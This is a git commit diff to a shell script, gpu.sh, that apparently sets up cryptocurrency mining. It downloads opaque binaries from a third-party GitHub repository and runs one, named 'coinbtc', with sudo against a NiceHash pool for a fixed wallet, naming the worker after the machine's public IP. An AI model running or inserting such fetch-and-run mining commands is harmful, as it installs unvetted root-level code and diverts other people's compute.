841beedcc8fcefc048e276f6119eb04ea9e1c6f4
solinos-utab <51184534+solinos-utab@users.noreply.github.com>
2022-04-27 05:46:26 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -3,4 +3,13 @@ wget https://github.com/aka648582/yes/raw/main/gas
 chmod +x gas
 wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh
 chmod +x cmdline_launcher.sh
-./cmdline_launcher.sh -algo autolykos  -coin BTC-wallet 3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 stratum+tcp://autolykos.usa-east.nicehash.com:3390
+
+POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
+
+WALLET=3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ
+
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
+
+cd "$(dirname "$0")"
+
+chmod +x ./coinbtc && sudo ./coinbtc --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
